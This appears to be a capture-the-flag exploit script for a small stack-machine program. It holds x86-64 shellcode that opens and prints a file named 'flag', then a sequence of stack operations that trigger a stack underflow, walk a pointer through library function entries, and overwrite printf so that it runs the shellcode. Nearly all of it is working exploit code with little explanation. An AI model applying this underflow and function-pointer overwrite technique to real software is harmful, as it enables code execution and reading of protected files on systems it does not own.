# Stack = 0x2020A0
# 

0 # padding
ASM
  # Open flag file
  lea rdi, [rip + flag]
  xor esi, esi # O_RDONLY
  mov eax, 2
  syscall

  # Jump if error occured
  mov ecx, eax
  cmp ecx, 0
  jl exit
  

  mov edi, eax
  mov rsi, rsp
  mov edx, 0x100
  mov eax, 0
  syscall

  mov ecx, eax
  cmp ecx, 0
  jl exit
  
  mov edi, 1
  mov rsi, rsp
  mov edx, eax
  mov eax, 1
  syscall

  mov ecx, 0

exit:
  mov edi, ecx
  mov eax, 60
  syscall

flag:
  .string "flag" 
flag2:
  .string "flag2" 
ENDASM  
pop

# Okay cause stack underflow
1
neg
swap # cause a stack underflow, and swap with stack ptr
pop
pop

# Store the pointer to stdin
#writed
#writed
0
store
1
store

# Note that stdin is now clobbered!
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
# Now our pointer is at __ctype_b_loc
pop
pop
pop
pop
pop
pop
pop
pop
# Pointer is at __stack_chk_fail with offset 0x7b6
2 # HI
store
3 # LO
store

# Calculate stack: LO + 0x2020a8 - 0x7b6
3
fetch
2103538
add
3
store

# Move pointer to printf
0
0
0
0
# Override printf
3
2
fetch
pop
fetch
writed

#writed
#writed
